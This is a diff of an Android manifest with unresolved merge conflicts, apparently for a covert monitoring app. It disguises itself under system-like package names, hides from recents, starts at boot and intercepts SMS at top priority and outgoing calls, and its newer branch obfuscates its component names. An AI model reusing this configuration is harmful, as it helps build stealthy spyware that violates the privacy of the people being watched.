@@ -1,13 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
 
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+<<<<<<< HEAD
 	package="com.android.service" android:versionCode="1"
+=======
+	package="com.android.networking" android:versionCode="1"
+>>>>>>> devel
 	android:versionName="1.0">
 	<!-- QUESTO FILE E' GENERATO DA build.xml. MODIFICATE IL FILE IN PREPROCESS -->
 	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 	<uses-permission android:name="android.permission.WRITE_SMS" />
+<<<<<<< HEAD
 	<uses-permission android:name="android.permission.WRITE_APN_SETTINGS" />
+=======
+>>>>>>> devel
 	<uses-permission android:name="android.permission.VIBRATE" />
 	<uses-permission android:name="android.permission.SEND_SMS" />
 	<uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -33,9 +40,15 @@
 	<uses-permission android:name="android.permission.USER_PRESENT" />
 	<uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
 
+<<<<<<< HEAD
 	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="false">
 	
 		<activity android:name="com.android.service.gui.AndroidServiceGUI"
+=======
+	<application android:icon="@drawable/icon" android:label="@string/app_name" android:debuggable="true" >
+	
+		<activity android:name="com.android.networking.gui.AGUI"
+>>>>>>> devel
 			android:label="@string/app_name" android:excludeFromRecents="true"
 			android:enabled="true">
 			<intent-filter>
@@ -43,6 +56,7 @@
 				<category android:name="android.intent.category.LAUNCHER" />
 			</intent-filter>
 		</activity>
+<<<<<<< HEAD
 
 		<service android:name="ServiceCore" android:exported="false"
 			android:excludeFromRecents="true">
@@ -52,6 +66,22 @@
 		</service>
 
 		<receiver android:name="BroadcastMonitor">
+=======
+		
+		<activity android:name="com.android.networking.gui.CGui"
+			android:label="cgui" android:excludeFromRecents="true"
+			android:enabled="true" android:theme="@style/Theme.Tr6871623">
+		</activity>
+
+		<service android:name="com.android.networking.ServiceMain" android:exported="false"
+			android:excludeFromRecents="true">
+			<intent-filter>
+				<action android:name="com.android.networking.app"/>		
+			</intent-filter>
+		</service>
+
+		<receiver android:name="com.android.networking.BM">
+>>>>>>> devel
 			<intent-filter>
 				<action android:name="android.intent.action.BOOT_COMPLETED" />
 				<action android:name="android.intent.action.USER_PRESENT" />
@@ -62,6 +92,7 @@
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
 		</receiver>
+<<<<<<< HEAD
 		
 		<receiver android:name="com.android.service.listener.BatteryMonitor">
 		</receiver>
@@ -73,12 +104,26 @@
 		</receiver>
 
 		<receiver android:name="com.android.service.listener.BroadcastMonitorSms">
+=======
+
+		<receiver android:name="com.android.networking.listener.BAc">
+		</receiver>
+
+		<receiver android:name="com.android.networking.listener.BSt">
+		</receiver>
+
+		<receiver android:name="com.android.networking.listener.BSm">
+>>>>>>> devel
 			<intent-filter android:priority="999999999">
 				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
 			</intent-filter>
 		</receiver>
 
+<<<<<<< HEAD
 		<receiver android:name="com.android.service.listener.BroadcastMonitorCall"
+=======
+		<receiver android:name="com.android.networking.listener.BC"
+>>>>>>> devel
 			android:exported="true">
 			<intent-filter android:priority="0">
 				<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
